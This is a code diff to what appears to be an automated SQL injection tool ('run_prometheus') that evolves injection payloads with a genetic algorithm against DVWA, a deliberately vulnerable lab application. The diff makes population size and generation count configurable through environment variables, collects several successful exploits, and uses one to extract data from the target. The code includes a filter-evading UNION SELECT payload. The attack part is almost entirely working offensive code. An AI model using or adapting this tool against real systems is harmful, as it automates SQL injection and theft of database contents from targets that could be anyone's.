@@ -29,6 +29,9 @@ def run_prometheus():
     target_user = os.getenv("TARGET_USER", "admin")
     target_pass = os.getenv("TARGET_PASS", "password")
     target_security = os.getenv("TARGET_SECURITY", "medium")
+    
+    pop_size = int(os.getenv("POPULATION_SIZE", "12"))
+    max_gens = int(os.getenv("MAX_GENERATIONS", "30"))
 
     if not client.setup_dvwa(username=target_user, password=target_pass, security_level=target_security):
         print("[!] Failed to establish session.", flush=True)
@@ -44,26 +47,40 @@ def run_prometheus():
       "1/*!50000UNION*//*!50000SELECT*/1,2"
     ]
 
-    island = IslandManager(client, base_payloads, exp_manager)
+    island = IslandManager(client, base_payloads, exp_manager, population_size=pop_size)
     
-    max_generations = 20
-    winning_payload = None
+    max_generations = max_gens
+    successful_payloads = set()
 
     for gen in range(max_generations):
         print(f"\n[+] Generation {gen + 1}/{max_generations}", flush=True)
-        result = island.evolve_generation(gen)
-        if result:
-            winning_payload = result
-            break
+        island.evolve_generation(gen)
+        
+        # Awareness: Check if we have new successes
+        current_successes = set(island.hall_of_fame)
+        new_successes = current_successes - successful_payloads
+        
+        if new_successes:
+            for payload in new_successes:
+                print(f"\n[!!!] NEW EXPLOIT DISCOVERED: {payload}", flush=True)
+                successful_payloads.add(payload)
+            
+            # If we have enough unique successes, we can stop early or keep going
+            if len(successful_payloads) >= 3:
+                print(f"\n[*] Target saturated with {len(successful_payloads)} unique exploits. Finalizing.", flush=True)
+                break
     
-    if winning_payload:
+    if successful_payloads:
         print("\n" + "*"*60, flush=True)
-        print(f"[!!!] EXPLOIT SUCCESSFUL!", flush=True)
-        print(f"[!] Winning Payload: {winning_payload}", flush=True)
+        print(f"[!!!] ATTACK PHASE COMPLETE: {len(successful_payloads)} SUCCESSFUL EXPLOITS FOUND", flush=True)
+        for i, p in enumerate(successful_payloads):
+            print(f"  {i+1}. {p}", flush=True)
         print("*"*60, flush=True)
         
-        print("\n[*] Initializing Data Extraction Phase...", flush=True)
-        final_response = client.send_request(winning_payload)
+        # Use the best one for extraction
+        best_payload = list(successful_payloads)[0]
+        print(f"\n[*] Initializing Data Extraction with optimal payload...", flush=True)
+        final_response = client.send_request(best_payload)
         extracted_data = extractor.extract(final_response['text'])
         print(extractor.format_report(extracted_data), flush=True)
     else:
